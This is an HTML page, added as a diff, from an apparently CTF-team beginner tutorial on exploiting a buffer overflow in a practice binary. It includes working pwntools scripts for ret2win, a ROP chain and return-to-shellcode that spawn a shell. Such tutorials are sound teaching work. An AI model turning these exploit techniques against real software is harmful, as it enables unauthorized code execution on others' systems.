@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Return to Shellcode [train 1] | Security Training</title>
+    <meta name="description" content="Welcome to the world of Binary Exploitation!">
+    <link href="/src/index.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <style>
+        body { 
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+        }
+        .code-block {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .gradient-text {
+            background: linear-gradient(135deg, #f97316, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
+        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        .toc-sidebar {
+            position: fixed;
+            top: 2rem;
+            left: 1rem;
+            max-height: calc(100vh - 4rem);
+            overflow-y: auto;
+            background: #1a1a1a;
+            border: 1px solid #374151;
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin-right: 0;
+            width: 280px;
+            flex-shrink: 0;
+            z-index: 10;
+        }
+        .toc-title {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #9ca3af;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #374151;
+            padding-bottom: 0.5rem;
+        }
+        .toc-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .toc-sublist {
+            list-style: none;
+            padding-left: 0.5rem;
+            margin-top: 0.25rem;
+        }
+        .toc-item {
+            margin: 0.25rem 0;
+        }
+        .toc-level-2 {
+            padding-left: 0.25rem;
+        }
+        .toc-level-3 {
+            padding-left: 0.75rem;
+        }
+        .toc-level-4 {
+            padding-left: 1.25rem;
+        }
+        .toc-link {
+            display: block;
+            color: #9ca3af;
+            text-decoration: none;
+            font-size: 0.875rem;
+            line-height: 1.5;
+            padding: 0.25rem 0;
+            border-radius: 0.25rem;
+            transition: all 0.2s;
+        }
+        .toc-link:hover {
+            color: #60a5fa;
+            background: #1f2937;
+            padding-left: 0.5rem;
+        }
+        @media (max-width: 1024px) {
+            .toc-sidebar {
+                display: none;
+            }
+        }
+        .prose h1 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-top: 3rem;
+            margin-bottom: 1.5rem;
+        }
+        .prose h2 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-top: 3rem;
+            margin-bottom: 1rem;
+            border-bottom: 2px solid #374151;
+            padding-bottom: 0.5rem;
+        }
+        .prose h3 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-top: 2rem;
+            margin-bottom: 0.75rem;
+        }
+        .prose h4 {
+            background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+            font-size: 1.25rem;
+            font-weight: 600;
+            margin-top: 1.5rem;
+            margin-bottom: 0.5rem;
+        }
+        .prose p {
+            margin-bottom: 1.5rem;
+            line-height: 1.7;
+            color: #d1d5db;
+        }
+        .prose strong {
+            color: #f3f4f6;
+            font-weight: 600;
+        }
+        .prose code {
+            background: #1e1e1e;
+            color: #fbbf24;
+            padding: 0.25rem 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .prose pre {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 2rem 0;
+        }
+        .prose pre code {
+            background: transparent;
+            color: #e5e7eb;
+            padding: 0;
+            border-radius: 0;
+        }
+        .prose blockquote {
+          background:rgb(93, 45, 26);
+          color:rgb(255, 255, 255);
+          border-left: 4px solid #ff8c00;
+          padding: 1rem 1.25rem;
+          margin: 1.25rem 0;
+          border-radius: calc(var(--radius) - 2px);
+        }
+
+        .prose ul, .prose ol {
+            list-style-color: #ff8c00;
+            list-style-type: disc;
+            list-style-position: outside;
+            margin: 1.5rem 0;
+            padding-left: 2rem;
+        }
+        .prose li {
+            margin: 0.5rem 0;
+            color: #d1d5db;
+        }
+        .prose li::marker {
+            color: #ff8c00 !important;
+        }
+        .prose ol li {
+            list-style-type: decimal;
+        }
+            margin: 2rem 0;
+            background: #1e1e1e;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .prose th, .prose td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        .prose th {
+            background: #2d2d2d;
+            color: #f3f4f6;
+            font-weight: 600;
+        }
+        .prose img {
+            border-radius: 8px;
+            margin: 2rem 0;
+            max-width: 100%;
+        }
+        .prose hr {
+            border: none;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #374151, transparent);
+            margin: 3rem 0;
+        }
+        .prose a { color: rgb(3, 203, 146); text-decoration: underline; }
+
+    </style>
+</head>
+<body class="min-h-screen">
+    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
+        <header class="mb-12">
+            <a href="/training" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">
+                <span class="gradient-text">Return to Shellcode [train 1]</span>
+            </h1>
+            <div class="mb-8"><img src="/trainings/Return-to-Shellcode-[train-1]/featured.png" alt="Return to Shellcode [train 1] cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
+            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
+                <span class="bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300 px-2.5 py-0.5 rounded-full text-xs font-medium">Beginner</span>
+                
+                <div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">pwn</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">training</span></div>
+            </div>
+        </header>
+
+        <div class="flex flex-col lg:flex-row justify-start gap-6">
+            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#binary-exploitation" class="toc-link">Binary Exploitation:</a></li><li class="toc-item toc-level-2"><a href="#challenge" class="toc-link">Challenge:</a></li><li class="toc-item toc-level-2"><a href="#prerequisites" class="toc-link">Prerequisites:</a></li></ul><li class="toc-item toc-level-1"><a href="#solution" class="toc-link">Solution:</a></li><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#general-procedure" class="toc-link">General Procedure:</a></li><li class="toc-item toc-level-2"><a href="#concept-of-buffer-overflow" class="toc-link">Concept of buffer overflow:</a></li><li class="toc-item toc-level-2"><a href="#stack" class="toc-link">Stack</a></li><li class="toc-item toc-level-2"><a href="#registers" class="toc-link">Registers:</a></li><li class="toc-item toc-level-2"><a href="#mitigations" class="toc-link">Mitigations:</a></li><li class="toc-item toc-level-2"><a href="#code-walkthrough" class="toc-link">Code walkthrough:</a></li><li class="toc-item toc-level-2"><a href="#main" class="toc-link">main:</a></li><li class="toc-item toc-level-2"><a href="#aim" class="toc-link">Aim:</a></li><li class="toc-item toc-level-2"><a href="#return-to-win" class="toc-link">Return to win:</a></li><li class="toc-item toc-level-2"><a href="#return-oriented-programming" class="toc-link">Return Oriented Programming:</a></li><ul class="toc-sublist"><ul class="toc-sublist"><li class="toc-item toc-level-4"><a href="#exploit-ret2win" class="toc-link">Exploit [ret2win]:</a></li></ul></ul><li class="toc-item toc-level-2"><a href="#exploit-simpler-version" class="toc-link">Exploit [simpler version]:</a></li><li class="toc-item toc-level-2"><a href="#return-2-shellcode" class="toc-link">return 2 shellcode:</a></li></ul></ul></nav></aside>
+            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
+<p>This is an initiative taken by team members of <a href="https://ctftime.org/team/128734">ARESx</a>. In this series of <strong>pwn-training</strong> we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will go in a slow paced fashion covering most of the small details, so anyone can follow along this wonderful course.</p>
+<h2 id="binary-exploitation">Binary Exploitation:</h2>
+<p>Any file that does some function/ work is called a binary. Breaking down the word, binary exploitation itself, gives the meaning. We try different ways to break/exploit a program(Binary). This has become a common category in games called CTFs.</p>
+<h2 id="challenge">Challenge:</h2>
+<p>Here we are given a binary and the source code as part of the challenge. Usually the programmer writes in high level languages (human understandable language). Then that is compiled into a machine understandable form - binary. Our job as a exploit dev, need to figure out what this binary does and find the bug to exploit this program.</p>
+<p><a href="/images/pwn-train1/ret2shellcode">vuln binary</a> and <br />
+<a href="/images/pwn-train1/ret2shellcode.c">vuln c code</a></p>
+<p>Play around with both the files a bit and continue reading this blog.</p>
+<h2 id="prerequisites">Prerequisites:</h2>
+<ul>
+<li>General understanding of linux.</li>
+<li>Curiosity to learn more by googling. (This is a must)</li>
+</ul>
+<h1 id="solution">Solution:</h1>
+<h2 id="general-procedure">General Procedure:</h2>
+<p>Before stepping in further into the solution, a common set of procedure when followed will make your job easier. Usually when you get a binary,</p>
+<ul>
+<li>Check the mitigations (check for all permissions, security restrictions) of the binary.</li>
+<li>Run the binary and get a feel of what it is doing.</li>
+<li>Try to debug the assembly code of main in a disassembler or debugger. (IDA/ GDB/ Hopper).</li>
+<li>Note down observations and proceed to write the exploit script.</li>
+</ul>
+<h2 id="concept-of-buffer-overflow">Concept of buffer overflow:</h2>
+<p>When we can write more than what we are supposed to write into a memory we call it a buffer overflow. Buffer overflows are common bugs when getting started in pwn. <strong>Gets</strong> is a vulnerable function that has a buffer overflow bug in it. It reads in more data than what the original array/ variable can handle. Multiple attacks will be discussed further on.</p>
+<p><img src="/images/pwn-train1/bufferoverflow.png" alt="" /></p>
+<h2 id="stack">Stack</h2>
+<p>A Stack is a memory segment, ment for storing data when a program is excecuted. This is a temporary storage unit. All the local variables created are stored here.</p>
+<h2 id="registers">Registers:</h2>
+<p>Registers are small data holding units. Think of it as variables used by the processor. Each register has its own unique job. <br />
+<img src="/images/pwn-train1/registers.png" alt="" /><br />
+<em>source:wikipedia</em></p>
+<h2 id="mitigations">Mitigations:</h2>
+<p>Before going into the exploitation, its better to check what mitigations are enabled for a binary. Mitigations are protections that were included to avoid certain attacks. We use the command <em>checksec</em> to see the basic mitigations in a binary.</p>
+<pre><code class="bash language-bash">checksec --file ./ret2shellcode
+</code></pre>
+<p><img src="/images/pwn-train1/pwntrain1.png" alt="" /></p>
+<p>If you don't have checksec installed then, open up a terminal and type the below command to install the checksec program.</p>
+<pre><code class="bash language-bash">sudo apt install checksec
+</code></pre>
+<p><strong>CANARY:</strong></p>
+<ul>
+<li>Its a set of characters stored on the stack to make sure no buffer overflows takes place.</li>
+</ul>
+<p><strong>No eXecute:</strong></p>
+<ul>
+<li>NX Enabled - This makes sure that the code on the stack is not excecuted.</li>
+<li>NX Disabled - Yea you guessed it, the code on the stack can be excecuted. </li>
+</ul>
+<p><strong>PIE:</strong></p>
+<ul>
+<li>Position Independent Excecutable: This mitigation will randomise the address of the code and PLT in the virtual memory each time the program gets excecuted.</li>
+</ul>
+<p><strong>RWX:</strong></p>
+<ul>
+<li>Read, write and execute : It'll tell us if the binary has segments(parts) that we can read, write and excecute.</li>
+</ul>
+<h2 id="code-walkthrough">Code walkthrough:</h2>
+<p>If you are a curious assembly code lover, make sure to head over to the gdb (GNU debugger) and dig deep. Here I'll go through the c code since its a basic writeup. In most scenarios you are not given the source code as it makes the task much easier. try to get comfy with assembly. <em>Or just use a disassembler lmao</em>.</p>
+<p><img src="/images/pwn-train1/pwntrain2.png" alt="" /></p>
+<p>Just ignore the <em>ignore_me()</em> function its for standard buffering and stuff. There are 2 functions called <strong>win</strong> and <strong>main</strong>. </p>
+<h2 id="main">main:</h2>
+<p>Looking at <strong>main</strong> function, we see there is a <strong>buf</strong> variable with size 0x60 and a <strong>puts</strong> call. There is also a <strong>printf</strong> that will leak the address of the buf variable. %p is the address pointing to something, with little bit of searching you will know, its the address of buf variable.</p>
+<p>There is another function called gets(). We know its a dangerous function. lets see why.</p>
+<pre><code class="bash language-bash">man gets
+</code></pre>
+<p><img src="/images/pwn-train1/pwntrain3.png" alt="" /></p>
+<p>Seems like gets will take input <ins>as long as there is a newline</ins> character which means we can get past the buf variable and mess things in the <strong>stack</strong>. </p>
+<p><strong>GDB</strong> is a debugger that will break down the program into its assembly code. It makes things easier for a reverse engineer to know what a program does. I have a different version/flavour of gdb called pwndbg. <a href="https://github.com/pwndbg/pwndbg">link to download</a></p>
+<pre><code class="gdb language-gdb">disass main
+</code></pre>
+<p><img src="/images/pwn-train1/pwntrain4.png" alt="" /></p>
+<p>Ok, This is the main function that we saw earlier. Here a <strong>stack frame</strong> is created with the command <code>push rbp; mov rbp,rsp</code> . In a stack for every new function a new stack frame is created to store the local variables required in that particular function. So when a function exits the stack frame also gets deleted. <em>le memory efficiency</em>.</p>
+<p>Point to note, The arguments to the function are passed via registers. RDI, RSI, RDX registers are used to store the first, second, third argument to a function.</p>
+<ul>
+<li>Here we see that the 3 arguments are set in the respective registers.</li>
+<li>Puts function is called with what is in the RDI register.</li>
+<li>We can also see a printf function which is called with RDI set to RIP+0xe29, which is the start of our buffer. Here RIP refers to the instruction pointer.</li>
+<li>Finally a gets is also called, which is exploited in our case.</li>
+</ul>
+<p>Now, we will set a break point in GDB to stop at a particular location that we specify during the runtime. By doing this, at a specific instruction we can know what the registers are holding and what changes are made at that point of time in the excecution.</p>
+<p>To set a breakpoint <strong>b * address of the instruction</strong>, in this case set a break point at ret instruction in main.</p>
+<pre><code class="gdb language-gdb">b* 0x0000000000401238
+</code></pre>
+<p>Take some time of your own, play around with the binary and see if you can crash the binary in some way.</p>
+<p>Great if you got a <strong>segfault</strong> else no worries. Well do it together. Run the binary in gdb with <code>r</code> and then give 0x60 "a"s, this will fill up the buf variable with all that garbage. After those random "a"s maybe create an offset pattern like <strong>111111112222222233333333</strong>. So incase the binary crashes we can see exactly where it crashed.</p>
+<blockquote>
+  <p>Segfault - It is caused because our program is trying to read a part of memory thats invalid </p>
+</blockquote>
+<p>In our case we overflowed the buf variable with "a"s and filling the RBP with <strong>11111111</strong> and finally making the return address point to <strong>22222222</strong>, Since there is no <strong>22222222</strong> address in memory, we will get a segfault. Whenever a program tries to jump to an address that is not there you will recieve a segfault error.</p>
+<p><img src="/images/pwn-train1/pwntrain5.jpg" alt="" /></p>
+<p>You can see all the values set in the registers like <code>RAX</code>, <code>RBX</code>, <code>RCX</code>. To our intrest we need the <code>RSP</code>.<br />
+The RSP is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want. </p>
+<h2 id="aim">Aim:</h2>
+<p>As an attacker our aim is to make this binary give a <strong>shell</strong> for us in the server. A shell is a way of getting complete access on whatever target we are attacking. In future blogs, you might also see that you wont have the root (admin) access in a shell. You have to do several privilage escalations to make yourself root, though all of those fun stuff are for another time.</p>
+<p>So we looked at a win() function earlier, this will land us a nice neat shell!<br />
+Though there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server. </p>
+<h2 id="return-to-win">Return to win:</h2>
+<p>Now since we control the return address of main function, why not lets change the return address to win function?</p>
+<ul>
+<li>Win function does <strong>execve("/bin/sh")</strong> -&gt; which means that it'll call a <strong>system</strong> function called <strong>execve</strong> and excecute the command <code>/bin/sh</code> which is a shell.</li>
+</ul>
+<p>ok lets start writing our script in python. First we will <code>import pwntools</code> library to make things easier. Next we will connect to our binary and send/recieve messages.</p>
+<pre><code class="python language-python">from pwn import * # Importing the library called pwntools
+
+p = process("ret2shellcode") # create a instance/process with the binary. helps to interact with the program. 
+p.sendline(b"a"*0x60 + b"a"*8 + p64(0x00000000004011a5)) # Send the payload(attack input) to the program.
+p.interactive() #If we get a shell make it interactive.
+</code></pre>
+<p>Here in the sendline command I am giving "a" * 0x60 to fill the buf variable and extra "a" * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ? </p>
+<blockquote>
+  <p>p64() function will make your address into little endian format. To know more about <a href="https://www.geeksforgeeks.org/little-and-big-endian-mystery/">formats</a></p>
+</blockquote>
+<p>Run this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?   </p>
+<p><img src="/images/pwn-train1/pwntrain6.png" alt="" /></p>
+<p>You can attach a gdb with your script and see where your script will crash / how it runs. But we are already given the c code and we know that there was some additional checks done to the <code>execve</code>.</p>
+<p><img src="/images/pwn-train1/pwntrain7.png" alt="" /></p>
+<p>So we have to somehow make the <code>arg1 = 0xdeadbeef</code> and <code>arg2 = 0xcafebabe</code>. This is where return oriented programming comes into picture. </p>
+<h2 id="return-oriented-programming">Return Oriented Programming:</h2>
+<p>This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that'll do something valuable to us.</p>
+<ul>
+<li>Since win is a function with arg1 and arg2 as parameters. We can set RDI = 0xdeadbeef and RSI = 0xcafebabe. Then call win function.</li>
+</ul>
+<h4 id="exploit-ret2win">Exploit [ret2win]:</h4>
+<p>Firstly we can get all the gadgets/code snippets in the binary with <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>. Then lets take out the ones that we want.</p>
+<pre><code class="bash language-bash">python3 ROPgadget.py --binary ../Documents/pwn-train/pwn1/ret2shellcode
+</code></pre>
+<p><img src="/images/pwn-train1/pwntrain8.png" alt="" /></p>
+<p>We can pop the registers to put the values we want and since every gadget has a return attached to it, we can call win function after those gadgets.</p>
+<pre><code class="python language-python">from pwn import *
+
+p = process("ret2shellcode")
+pause()
+p.sendline(b"a"*0x60 + b"a"*8 + p64(0x000000000040129b) + p64(0xdeadbeef) + p64(0x0000000000401299) + p64(0xcafebabe) + p64(0) + p64(0x00000000004011a5))
+p.interactive()
+</code></pre>
+<p><img src="/images/pwn-train1/pwntrain9.png" alt="" /></p>
+<h2 id="exploit-simpler-version">Exploit [simpler version]:</h2>
+<p>I know you went through all the struggle to set the arguments right, but if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function. </p>
+<pre><code class="python language-python">from pwn import *
+
+p = process("ret2shellcode")
+p.sendline(b"a"*0x60 + b"a"*8 + p64(0x00000000004011d1)) # address to execve
+p.interactive()
+</code></pre>
+<blockquote>
+  <p>Here we avoided the constraints and directly jumped to the execve funtion. Clever of you.</p>
+</blockquote>
+<h2 id="return-2-shellcode">return 2 shellcode:</h2>
+<p>This is the third and final way that we will discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. This time ignore the win() function. Without the help of helper function get a shell yourself :D . </p>
+<p>Remember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.</p>
+<blockquote>
+  <p>A shellcode is a set of instruction that will give you a shell or does some function that you want when excecuted.</p>
+</blockquote>
+<ul>
+<li>First step is to store the leak in a variable. We will use <strong>recvline</strong> function here to recv the output given by the program.</li>
+<li>Write all the commands that you want to excecute to get a shell (pwntools has inbuilt functionalities :D ).</li>
+<li>Fill the gap between the return and the shellcode with dummy instructions called nop.</li>
+<li>Jump back to buf variable.</li>
+</ul>
+<pre><code class="python language-python">#!/usr/bin/env python3
+from pwn import *
+
+def start():
+    global p
+    if args.REMOTE:
+        p = remote('localhost', 1337)
+    else:
+        p = elf.process() # start the process.
+
+context.binary = elf = ELF('./ret2shellcode') 
+start()
+
+buf_addr = int(p.recvlines(2)[-1].split()[-1], 16) # recvlines and then get the leak
+
+payload = asm(shellcraft.linux.sh()) # generates a shellcode compatible with linux systems
+payload += b'\x90'*(104 - len(payload)) # spans the gap between buf variable and return 
+payload += p64(buf_addr) # address of the buf variable
+
+p.sendline(payload) # send the payload
+
+p.interactive() # doesnt close the shell and keeps it open for us.
+p.close()
+</code></pre>
+<p>Hope you liked the pwn training 1. More training writeups coming soon ! :D </p>
+            </article>
+        </div>
+
+        <!-- Navigation -->
+        <nav class="mt-16 pt-8 border-t border-gray-700">
+            <div class="flex justify-between items-center">
+                <div class="flex-1">
+                    <a href="/trainings/Youtube-Stack-Basics.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+                        </svg>
+                        <div class="text-left">
+                            <div class="text-xs text-gray-400">Previous</div>
+                            <div class="font-medium">Youtube - Stack Basics</div>
+                        </div>
+                    </a>
+                </div>
+                <div class="flex-1 text-center">
+                    <a href="/training" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Trainings</a>
+                </div>
+                <div class="flex-1 text-right">
+                    <a href="/trainings/Format-String-Exploitation-[train-2].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <div class="text-right">
+                            <div class="text-xs text-gray-400">Next</div>
+                            <div class="font-medium">Format String Exploitation [train 2]</div>
+                        </div>
+                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </nav>
+    </div>
+<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
+</body>
+</html>
